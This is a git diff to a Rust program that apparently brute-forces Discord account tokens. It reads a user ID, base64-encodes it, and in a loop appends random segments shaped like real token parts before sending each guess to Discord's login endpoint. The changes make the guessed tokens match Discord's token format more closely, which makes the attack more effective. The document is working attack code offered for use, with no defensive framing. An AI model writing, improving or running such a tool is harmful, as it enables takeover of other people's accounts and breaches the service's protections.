@@ -11,12 +11,12 @@ use std::sync::Arc;
 #[tokio::main]
 async fn main() {
     let mut id_to_token = String::new();
-    println!("ID TO TOKEN --> ");
+    println!("User ID: ");
     io::stdin()
         .lock()
         .read_line(&mut id_to_token)
         .expect("Failed to read input");
-    let id_to_token = base64::encode(id_to_token.trim().as_bytes());
+    let encoded_user_id = base64::encode(id_to_token.trim().as_bytes());
 
     // AtomicBool to track Ctrl+C signal
     let running = Arc::new(AtomicBool::new(true));
@@ -29,11 +29,10 @@ async fn main() {
     .expect("Error setting Ctrl+C handler");
 
     while running.load(Ordering::SeqCst) {
-        let token = format!(
-            "{}.{}",
-            id_to_token,
-            generate_random_string(4) + "." + &generate_random_string(25)
-        );
+        let timestamp = generate_random_string(6);
+        let hmac = generate_random_string(27);
+
+        let token = format!("{}.{}.{}", encoded_user_id, timestamp, hmac);
         let client = Client::new();
         let login_url = "https://discordapp.com/api/v9/auth/login";
         let mut headers = HeaderMap::new();
@@ -69,6 +68,7 @@ fn generate_random_string(length: usize) -> String {
         .map(|i| (i + b'a') as char)
         .chain((0..26).map(|i| (i + b'A') as char))
         .chain((0..10).map(|i| (i + b'0') as char))
+        .chain(vec!['-', '_'])
         .collect();
     (0..length)
         .map(|_| characters.choose(&mut rng).unwrap())
